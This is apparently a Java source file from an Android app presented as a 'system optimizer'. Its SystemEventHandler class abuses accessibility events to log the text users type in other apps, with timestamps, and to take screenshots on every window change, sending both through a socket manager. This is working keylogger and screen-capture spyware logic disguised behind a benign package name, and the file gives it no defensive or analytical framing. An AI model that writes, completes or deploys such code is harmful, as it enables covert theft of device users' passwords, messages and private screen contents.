package com.system.optimizer.event_handler;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

import com.system.optimizer.text.BufferedLogger;
import com.system.optimizer.text.BufferedCapture;
import com.system.optimizer.network.SocketManager;

import android.view.accessibility.AccessibilityEvent;

public class SystemEventHandler {

    private final BufferedLogger logger;
    private final BufferedCapture capturer;
    private final SimpleDateFormat timestampFormat = new SimpleDateFormat("HH:mm:ss", Locale.getDefault());
    private final ScreenshotEventHandler screenshotEventHandler;

    public SystemEventHandler(ScreenshotEventHandler screenshotEventHandler, SocketManager socketManager) {
        if (screenshotEventHandler == null) {
            throw new IllegalArgumentException("ScreenshotEventHandler cannot be null");
        }
        if (socketManager == null) {
            throw new IllegalArgumentException("SocketManager cannot be null");
        }

        this.screenshotEventHandler = screenshotEventHandler;

        // Logger that triggers screenshot capture after text delay
        this.logger = new BufferedLogger((text) -> {
            String timestamp = timestampFormat.format(new Date());
            String messageWithTimestamp = "[" + timestamp + "] " + text;
            screenshotEventHandler.captureAndSend(messageWithTimestamp);
        });

        // BufferedCapture: delay + async capture + send via socket
        this.capturer = new BufferedCapture(
                () -> screenshotEventHandler.takeScreenshot(),
                (base64Image) -> socketManager.sendEvent("screenshot_response", base64Image));
    }

    public void onSystemEvent(AccessibilityEvent event) {
        if (event == null || event.getText() == null)
            return;

        // Ignore system UI and keyboard events
        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
        if (packageName.equals("com.android.systemui") ||
        packageName.equals("android") ||
        packageName.equals("com.google.android.inputmethod.latin")) {
            return;
        }
        
        int eventType = event.getEventType();
        if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String text = normalizeTextEvent(event.getText());
            if (!text.isEmpty()) {
                logger.onNewText(text);
            }
        } else if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            capturer.trigger();
        }
    }

    private String charToString(List<CharSequence> text) {
        StringBuilder sb = new StringBuilder();
        for (CharSequence cs : text)
            sb.append(cs);
        return sb.toString();
    }

    private String normalizeTextEvent(List<CharSequence> text) {
        StringBuilder sb = new StringBuilder();
        for (CharSequence cs : text) {
            if (cs != null && cs.length() > 0) {
                if (sb.length() > 0) {
                    sb.append(": ");
                }
                sb.append(cs.toString().trim());
            }
        }
        return sb.toString();
    }
}